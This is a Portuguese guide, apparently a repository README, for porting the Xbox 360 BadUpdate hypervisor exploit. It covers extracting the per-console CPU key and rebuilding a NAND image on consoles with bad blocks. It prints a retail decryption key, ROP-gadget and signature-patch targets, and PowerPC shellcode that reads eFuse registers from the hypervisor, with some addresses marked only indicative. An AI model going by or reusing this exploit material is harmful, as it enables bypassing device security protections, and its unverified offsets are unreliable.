A **CPU key** é uma chave de 128 bits (32 caracteres hexadecimais) gravada permanentemente nos **eFuses do processador**. Ela não está na NAND, não está num arquivo, e não pode ser extraída remotamente por meios convencionais.

A CPU key é necessária **apenas para a Categoria 6** (dados internos do hypervisor). Para as Categorias 1–5, você precisa apenas da **retail XEX2 key** (chave pública conhecida) — veja a próxima seção.

**Como obter a CPU key do seu console:**

```
Opção A — Via BadUpdate exploit (sem hardware, requer port para sua versão):
    1. Porte o BadUpdate para a versão do seu kernel (veja abaixo)
    2. Execute o exploit — ele atinge Ring -1 (hypervisor)
    3. Um payload XKE personalizado lê os registradores MMIO dos eFuses
    4. A CPU key é gravada em um arquivo no USB
    → Veja a seção "Extraindo a CPU key via BadUpdate" abaixo

Opção B — Console com JTAG ou RGH exploit já instalado:
    1. Baixe o xell-reloaded (ou xell-gggggg)
    2. Grave na NAND via JRunner ou nandpro
    3. Ligue o console — o xell-reloaded exibe a CPU key via HDMI e porta UART
    4. Copie os 32 caracteres hexadecimais

Opção C — Console com RGH rodando via JRunner (Windows):
    1. Conecte o console via USB (modo programador) com RGH ativo
    2. Abra o JRunner → "Read Nand" → ele lê a CPU key automaticamente

Opção D — Console JTAG com xbdm.xex rodando:
    1. Conecte via Xenia Developer Kit ou Xbox 360 SDK debug tools
    2. Leia o registro EFUSE_OVERRIDE / XeCryptEfuseRead via kernel debug calls
```

> **Situação NAND com bad blocks:** Se o seu console tem bad blocks na NAND e não consegue atualizar, mas **funciona normalmente**, o BadUpdate (Opção A acima) é exatamente o caminho. O exploit não requer que a NAND esteja em condições de atualização — ele é executado via save game/avatar item, sem modificar a NAND. Veja a seção "Minha NAND tem bad blocks" abaixo.

---

## Ferramenta incluída: `Tools/nand_info.py`

O repositório inclui um script Python que analisa um dump de NAND e extrai as informações disponíveis:

```bash
# Requer Python 3.10 ou superior
python3 Tools/nand_info.py <seu_dump.bin>

# Com diretório de saída personalizado:
python3 Tools/nand_info.py dump.bin -o meu_dump_extraido/

# Só análise, sem gravar arquivos:
python3 Tools/nand_info.py dump.bin --no-extract
```

**O que o script faz:**

1. Detecta o formato do dump:
   - `16 MB sem spare` (0x01000000 bytes) — dump limpo
   - `16 MB com spare` (0x01080000 bytes) — dump com bytes ECC intercalados, que o script remove automaticamente
   - Tamanhos desconhecidos (consoles Slim/eMMC) — tentativa parcial

2. Escaneia os primeiros 32 blocos em busca de cabeçalhos de bootloader conhecidos (CB-A, CB-B, CD, CF, CG) e exibe a versão de cada um

3. Escaneia todo o dump em busca do magic `XEX2` e para cada ocorrência:
   - Parseia o cabeçalho opcional `execution_id` para extrair versão e `title_id`
   - Identifica automaticamente o kernel (`title_id = 0x00000000`)
   - Extrai o blob XEX2 bruto (ainda criptografado) para o diretório de saída

4. Exibe o resumo: versão do kernel detectada, nome do `KernelConfig` correspondente, e próximos passos

**Exemplo de saída para um dump com kernel 17559:**

```
[*] Loading: meu_dump.bin
[*] File size : 0x01080000 bytes  (16.50 MB)
[*] Format    : 16 MB small-block (WITH spare bytes — stripped to 0x01000000 bytes)

[*] Scanning for bootloader headers …
    offset 0x00004000  magic=0x0220  CB-B  (Jasper 16 MB)   version= 1888 (0x0760)  size=0x8000

[*] Scanning for XEX2 binaries …
    Found 3 XEX2 magic occurrence(s)

    XEX2 at 0x00ABC000:
      version   = 2.0.17559.0  (build 17559 = 0x4497)
      title_id  = 0x00000000  ← likely kernel (xboxkrnl.exe)
      *** Identified as kernel — build 17559 ***
      Extracted (raw/encrypted) → nand_extracted/xex2_offset_0x00ABC000.xex
    ...

SUMMARY
  Kernel version : 17559  (0x4497)
  KernelConfig   : Common/KernelConfig_Retail_17559.asm
```

---

## Workflow completo: do dump da NAND até o `KernelConfig`

```
dump.bin (NAND bruta)
    │
    ▼
python3 Tools/nand_info.py dump.bin
    │
    ├─ Detecta versão do kernel (sem CPU key)
    │      → Cria Common/KernelConfig_Retail_<ver>.asm
    │
    └─ Extrai XEX2 brutos → nand_extracted/*.xex
           │
           ▼  (retail key — sem CPU key!)
       xextool -e retail xboxkrnl.exe
       xextool -e retail xam.xex
       xextool -e retail bootanim.xex
           │
           ├─ xboxkrnl_dec.bin  → IDA/Ghidra (PPC64 BE)
           │       │
           │       ├─ Funções exportadas    → Categoria 1 (kernel functions)
           │       ├─ Ordinals de syscall   → Categoria 3 (sc_Hvx*)
           │       ├─ Gadgets ROP           → Categoria 4 (kernel gadgets)
           │       ├─ XexpVerifyXexHeaders  → Categoria 6b (kernel RSA patch offset)
           │       └─ BootAnimCodePageAddr  → Categoria 5 (analisar loader do bootanim)
           │
           ├─ xam_dec.bin       → IDA/Ghidra (PPC64 BE)
           │       │
           │       ├─ Export table (ordinals) → Categoria 2 (XAM functions)
           │       └─ Gadgets ROP            → Categoria 4 (XAM gadgets)
           │
           └─ hypervisor_dec.bin → (requer CPU key) IDA/Ghidra (PPC32 BE, no-MMU)
                   │
                   ├─ HvpRelocateCacheLines → Categoria 6a
                   ├─ HvpSetRMCI           → Categoria 6a
                   ├─ HvpImageSignatureVerification → Categoria 6b (HV RSA patch offset)
                   └─ Últimos 0x10000 bytes do HV → Stage4_CleanHvData_Retail_<ver>.bin

NOTA: Use o pacote de atualização oficial ($SystemUpdate) em vez do dump
      da NAND quando possível — é mais fácil de obter e não precisa de
      extração: python3 Tools/update_info.py $SystemUpdate/
```

---

## Formatos de dump suportados

| Tamanho do arquivo | Formato | Suportado |
|---|---|---|
| 0x01000000 (16 MB) | Small-block sem spare | ✅ Sim |
| 0x01080000 (16,5 MB) | Small-block com spare ECC | ✅ Sim (spare removido automaticamente) |
| 0x04000000 (64 MB) | Big-block Jasper 256MB? | ⚠️ Tentativa parcial |
| 0x40000000 (1 GB+) | Trinity/Corona eMMC | ❌ Não suportado |

Para dumps de consoles Slim (Trinity/Corona/Winchester) o layout eMMC é diferente e o script atual não suporta. Nesses casos, use ferramentas específicas como o **xeBuild** ou **JRunner** que têm suporte específico para eMMC.

---

## Ferramentas externas necessárias

| Ferramenta | Uso | Onde encontrar |
|---|---|---|
| **xextool** | Descriptografar XEX2 com a retail key (sem CPU key) | Compilar do source free60 ou releases da comunidade |
| **xbdecompress** | Descomprimir dados LZX do Xbox 360 | free60 / GITHUB |
| **JRunner** | Extrair CPU key de console JTAG/RGH via USB | jrunner.codeplex.com (arquivado) / GitHub mirrors |
| **xell-reloaded** | Obter CPU key via HDMI/UART no console | GitHub: xell-reloaded |
| **xeBuild** | Criar nova imagem de NAND a partir de CPU key + dump | GitHub: xeBuild (comunidade) |
| **IDA Pro** | Disassembler para PPC64 BE | Comercial (versão gratuita limitada disponível) |
| **Ghidra** | Disassembler gratuito com suporte a PPC64 | ghidra.re |
| **Radare2** | Disassembler open-source | rada.re |


---

# Sem a CPU key: usando o pacote de atualização oficial

**Contexto:** O usuário tem um dump da NAND mas não tem a CPU key. Quer portar o exploit para sua versão de kernel. Pode usar o arquivo de atualização oficial do Xbox 360 para extrair os dados necessários?

**Resposta curta: SIM** — para as Categorias 1–5. O pacote de atualização oficial usa a **retail XEX2 key** (chave pública conhecida), não a CPU key.

---

## O que é o pacote de atualização oficial ($SystemUpdate)

A Microsoft distribui atualizações de sistema do Xbox 360 como uma pasta chamada `$SystemUpdate` contendo arquivos XEX2 comuns como `xboxkrnl.exe` e `xam.xex`. Esses mesmos arquivos são instalados na NAND durante uma atualização normal.

**Fontes para obter o pacote da sua versão:**
- Arquivos de atualização do Xbox 360 são amplamente disponíveis em mirrors da comunidade (xboxunity.net, free60.org, GitHub mirrors)
- Você também pode extrair o `$SystemUpdate` do próprio dump da NAND usando `Tools/nand_info.py`

---

## A retail XEX2 key — sem CPU key necessária

Todos os arquivos XEX2 no pacote de atualização oficial usam a **retail XEX2 key**, que é uma constante pública conhecida pela comunidade de modding do Xbox 360 há mais de 15 anos. Ela é diferente da CPU key (que é única por console).

O `xextool` suporta descriptografia direta usando a retail key:

```bash
# Decriptar com a retail key (sem CPU key):
xextool -e retail xboxkrnl.exe
xextool -e retail xam.xex
xextool -e retail bootanim.xex
```

Isso produz binários PPC64 descriptografados que contêm todas as informações necessárias para as Categorias 1–5.

---

## Ferramenta incluída: `Tools/update_info.py`

O repositório inclui um script Python que analisa um pacote de atualização oficial e gera todos os comandos necessários:

```bash
# Requer Python 3.10 ou superior
python3 Tools/update_info.py /caminho/para/$SystemUpdate/

# Ou para um único arquivo:
python3 Tools/update_info.py xboxkrnl.exe
```

**O que o script faz:**

1. Escaneia o diretório em busca de arquivos XEX2
2. Parseia o cabeçalho `execution_id` para detectar a versão do kernel
3. Identifica cada arquivo (kernel, XAM, bootanim) e para que serve no porting
4. Gera os comandos `xextool` corretos para cada arquivo
5. Lista exatamente o que procurar em cada binário após a descriptografia
6. Indica o nome do `KernelConfig` a criar e os próximos passos

**Exemplo de saída:**

```
  Detected kernel version : 17559  (0x4497)
  KernelConfig to create  : Common/KernelConfig_Retail_17559.asm

  ENCRYPTION: NO CPU KEY REQUIRED
  ─────────────────────────────────
    Retail key : 20B185A59D28FDF05A249AD90C8B3E2A

  XEXTOOL COMMANDS (decrypt with retail key)
  ────────────────────────────────────────────
    # Xbox 360 Kernel  →  Category 1, Category 3, Category 4, Category 5 (partial)
    xextool -e retail "xboxkrnl.exe" -o "xboxkrnl_dec.bin"

    # Xbox Application Manager  →  Category 2, Category 4
    xextool -e retail "xam.xex" -o "xam_dec.bin"

    # Boot Animation XEX  →  Category 5
    xextool -e retail "bootanim.xex" -o "bootanim_dec.bin"
```

---

## Tabela: o que cada arquivo fornece para o port

| Arquivo | Descriptografia | Categorias cobertas |
|---|---|---|
| `xboxkrnl.exe` | Retail key (sem CPU key) | 1 (kernel functions), 3 (syscalls), 4 (kernel gadgets), 5 (bootanim page) |
| `xam.xex` | Retail key (sem CPU key) | 2 (XAM functions), 4 (XAM gadgets) |
| `bootanim.xex` | Retail key (sem CPU key) | 5 (BootAnimCodePageAddress) |
| HV binary (em NAND) | **CPU key** (per-console) | 6 (HV functions, RSA patch offsets, CleanHvData) |

Com o pacote de atualização e a retail key, você cobre **5 das 6 categorias** sem precisar da CPU key.

---

# Minha NAND tem bad blocks — qual é o plano?

**Situação:** A NAND tem bad blocks. O console **funciona normalmente** (joga, acessa dashboard, etc.) mas a atualização de sistema falha. O objetivo é extrair a CPU key via BadUpdate para criar uma nova imagem de NAND limpa.

**Boa notícia:** o BadUpdate é um exploit de **software puro** que não modifica a NAND e não requer que o console esteja em condições de atualização. Ele roda via save game do Tony Hawk's American Wasteland (ou item de avatar no ABadAvatar) — se o console funciona normalmente, o exploit pode rodar.

---

## Plano geral

```
Passo 1 — Identificar a versão de kernel atual
    │
    ├─ Se você tem o dump da NAND:
    │      python3 Tools/nand_info.py dump.bin
    │      → Detecta a versão do kernel
    │
    └─ Se você não tem o dump:
           Vá em: Sistema → Informações do console → Versão do kernel

Passo 2 — Obter o pacote de atualização para a sua versão
    │
    └─ Baixe o $SystemUpdate da sua versão dos mirrors da comunidade
       python3 Tools/update_info.py $SystemUpdate/
       → Confirma a versão e gera os comandos de descriptografia

Passo 3 — Descriptografar os binários com a retail key (sem CPU key!)
    │
    ├─ xextool -e retail xboxkrnl.exe  → xboxkrnl_dec.bin
    ├─ xextool -e retail xam.xex       → xam_dec.bin
    └─ xextool -e retail bootanim.xex  → bootanim_dec.bin

Passo 4 — Disassembler (IDA Pro / Ghidra, PPC64 BE)
    │
    ├─ Encontrar todos os endereços das Categorias 1–5
    └─ Criar Common/KernelConfig_Retail_<sua_versão>.asm

Passo 5 — Construir e rodar o exploit
    │
    ├─ Atualizar Common/BuildConfig.asm, Stage4/BadUpdateExploit-4thStage.asm
    ├─ Executar build_exploit.bat (para a sua versão de kernel)
    └─ Rodar o exploit no console

Passo 6 — Extrair a CPU key via exploit
    │
    ├─ Após Stage 4 (Ring -1), o kernel/HV está patcheado para rodar código não-assinado
    └─ Um XKE payload personalizado lê os registradores eFuse e grava a CPU key em USB
       → Veja a seção "Extraindo a CPU key via BadUpdate" abaixo

Passo 7 — Criar nova imagem de NAND
    │
    ├─ Use xeBuild GUI ou CLI com a CPU key e o dump original
    ├─ xeBuild gera uma nova imagem de NAND limpa (sem bad blocks marcados)
    └─ Flash da nova imagem via programador (nandpro / JRunner / hardware)
```

---

## Por que o bad block não impede o exploit?

O exploit não faz `XeUpdateSystemSoftware()` real. Ele usa o processo de atualização apenas como vetor de entrada para corromper o contexto do decoder LZX (Stage 3 — race condition). A NAND não precisa estar em condições de receber uma atualização; o console só precisa conseguir **processar** o arquivo de atualização na memória RAM.

---

# Extraindo a CPU key via BadUpdate

**Contexto:** Após executar o BadUpdate com sucesso, o Stage 4 alcança Ring -1 (execução de código no hypervisor) e patcha o HV e o kernel para aceitar código não-assinado. Neste ponto, é possível ler os eFuses do processador, que contêm a CPU key.

---

## Onde está a CPU key no hardware

A CPU key de 128 bits (16 bytes) está gravada nos **eFuses do processador Xenon/Zephyr/Falcon/Jasper** do Xbox 360. Os eFuses são acessados via MMIO (Memory-Mapped I/O) a partir do hypervisor:

```
Endereço físico do controlador de eFuse: 0x8000020000EF0000
Registrador de seleção de linha:         0x8000020000EF0210
Registrador de dados (leitura):          0x8000020000EF0218

Layout dos eFuses relevantes (cada linha tem 64 bits):
  Linha 0  — hash do lockdown (não é a CPU key)
  Linha 1  — região/proteção de boot
  Linha 2  — primeiros 64 bits da CPU key
  Linha 3  — últimos 64 bits da CPU key
  Linhas 4–7 — outros dados (FCRT hash, etc.)
```

Para ler a CPU key, basta ler 16 bytes dos eFuses (linhas 2 e 3).

---

## Abordagem 1: Payload XKE personalizado (pós-exploit)

Após o BadUpdate patchar o kernel para aceitar código não-assinado (Stage 4), você pode criar um `xke_update.bin` personalizado que:

1. Usa `MmMapIoSpace()` para mapear a região MMIO dos eFuses
2. Lê 16 bytes das linhas 2 e 3
3. Grava os 32 caracteres hexadecimais num arquivo `/Usb0/cpu_key.txt` no USB

Esqueleto conceitual em pseudocódigo PowerPC:

```asm
# Mapear o controlador de eFuse (endereço físico 0x8000020000EF0000)
# via MmMapIoSpace (Category 1 — endereço a resolver do kernel descriptografado)
li      %r3, EFUSE_PHYS_ADDR_HI
li      %r4, EFUSE_PHYS_ADDR_LO
li      %r5, 0x1000             # tamanho a mapear
bl      MmMapIoSpace            # retorna VA mapeado em r3

# Ler linha 2 (primeiros 8 bytes da CPU key)
# Escrever índice de linha no registrador de seleção
li      %r6, 2                  # linha 2
stw     %r6, 0x210(%r3)
eieio
ld      %r7, 0x218(%r3)         # ler 64 bits

# Ler linha 3 (últimos 8 bytes da CPU key)
li      %r6, 3                  # linha 3
stw     %r6, 0x210(%r3)
eieio
ld      %r8, 0x218(%r3)         # ler 64 bits

# r7:r8 agora contém a CPU key de 128 bits
# Gravar em arquivo USB via NtCreateFile + NtWriteFile
```

> **Nota:** O `xke_update.bin` padrão do repositório não implementa a leitura de eFuses. Você precisará desenvolver um payload personalizado ou adaptar um payload existente da comunidade (como os payloads de extração usados no xell-reloaded).

---

## Abordagem 2: Extensão direta do Stage 4

Alternativamente, o Stage 4 (`BadUpdateExploit-4thStage.asm`) pode ser estendido para ler os eFuses no próprio shellcode do hypervisor e escrever a CPU key num endereço de memória fixo, para que o Stage 3 ou o payload posterior possa lê-la.

O Stage 4 já tem acesso total ao hardware. Adicionar ao final do shellcode existente:

```asm
# Ler CPU key dos eFuses (executa em Ring -1 — acesso direto ao hardware)
lis     %r10, 0x8000
ori     %r10, %r10, 0x0200
rldicr  %r10, %r10, 32, 31
oris    %r10, %r10, 0x00EF
ori     %r10, %r10, 0x0000     # 0x80000200.00EF0000 = base do eFuse controller

# Linha 2 — primeiros 64 bits da CPU key
li      %r11, 2
stw     %r11, 0x210(%r10)      # selecionar linha 2
eieio
ld      %r11, 0x218(%r10)      # ler 64 bits

# Linha 3 — últimos 64 bits da CPU key
li      %r12, 3
stw     %r12, 0x210(%r10)      # selecionar linha 3
eieio
ld      %r12, 0x218(%r10)      # ler 64 bits

# Guardar em endereço fixo para leitura posterior
lis     %r9, 0x8000
ori     %r9, %r9, 0x0300       # exemplo: 0x80000300.00000000 (RAM livre)
rldicr  %r9, %r9, 32, 31
std     %r11, 0(%r9)           # primeiros 8 bytes da CPU key
std     %r12, 8(%r9)           # últimos 8 bytes da CPU key
```

> **Nota:** Os endereços exatos dos eFuses e da RAM livre variam por revisão de hardware e versão de kernel. Os valores acima são indicativos. Consulte a documentação do free60 para os offsets específicos da sua revisão.

---

## Abordagem 3: Usar o payload do xell-reloaded como XKE

O xell-reloaded implementa leitura de eFuses e exibe a CPU key via HDMI. Partes do seu código de leitura de eFuses podem ser adaptadas como um payload XKE que grava a CPU key num arquivo USB em vez de exibir na tela.

---

# Recriando a NAND com bad blocks usando a CPU key

Com a CPU key em mãos, você pode criar uma nova imagem de NAND limpa usando o **xeBuild**.

---

## Workflow com xeBuild

```bash
# 1. Obter o pacote de atualização oficial para a sua versão de kernel
#    (o mesmo que você usou para portar o exploit)

# 2. Usar o xeBuild GUI (Windows) ou CLI:
xeBuild.exe --console <tipo> --version <versão> --cpukey <cpu_key_hex> \
            --input dump_original.bin --output nand_nova.bin

# Onde:
#   <tipo>       = fat / jasper / trinity / corona / winchester
#   <versão>     = a versão alvo (ex: 17559) — pode ser a mesma ou uma versão mais nova
#   <cpu_key_hex> = os 32 caracteres hexadecimais da CPU key
```

O xeBuild gera uma imagem de NAND que:
- Não tem bad blocks marcados (imagem limpa)
- Contém os bootloaders atualizados para a versão desejada
- Está encriptada com sua CPU key (como qualquer NAND original)

---

## Flashando a nova NAND

Após gerar a imagem limpa, use um programador para flashar:

| Ferramenta | Conexão | Notas |
|---|---|---|
| **JRunner** (Windows) | USB (modo NAND writer) | Mais fácil; suporta a maioria dos consoles |
| **nandpro** | LPT / USB (hardware externo) | Tradicional; suporta todos os consoles |
| **Clip-on NAND programmer** | Diretamente no chip NAND | Para casos onde o console não inicializa |

> **Cuidado:** Sempre faça um dump (backup) da NAND original antes de flashar. Mesmo com bad blocks, o dump pode conter dados recuperáveis. Use `JRunner → Read Nand` ou `nandpro` para criar o backup.

---

## Resumo do fluxo completo para NAND com bad blocks

| Passo | Ferramenta | Requer CPU key? |
|---|---|---|
| 1. Identificar versão do kernel | `nand_info.py` | ❌ |
| 2. Obter pacote de atualização | Download manual | ❌ |
| 3. Gerar comandos de descriptografia | `update_info.py` | ❌ |
| 4. Descriptografar xboxkrnl.exe e xam.xex | `xextool -e retail` | ❌ |
| 5. Encontrar endereços (Categorias 1–5) | IDA Pro / Ghidra | ❌ |
| 6. Encontrar dados do HV (Categoria 6) | IDA Pro / Ghidra | ✅ (ou pular para passo 8) |
| 7. Compilar o exploit | `build_exploit.bat` | ❌ |
| 8. Executar o exploit no console | USB + save game | ❌ |
| 9. Payload XKE lê CPU key dos eFuses | payload customizado | ❌ (lê diretamente do HW) |
| 10. Criar nova imagem de NAND | `xeBuild` | ✅ |
| 11. Flashar nova NAND | JRunner / nandpro | ❌ |

> **Nota sobre o passo 6:** Para uma primeira execução, você pode pular a Categoria 6 completamente e usar os dados do kernel 17559 como ponto de partida para testes. Se a versão for próxima de 17559, muitos offsets podem ser idênticos ou similares. O importante é executar o exploit com sucesso para extrair a CPU key — depois disso, você pode revisitar a Categoria 6 com os dados corretos.
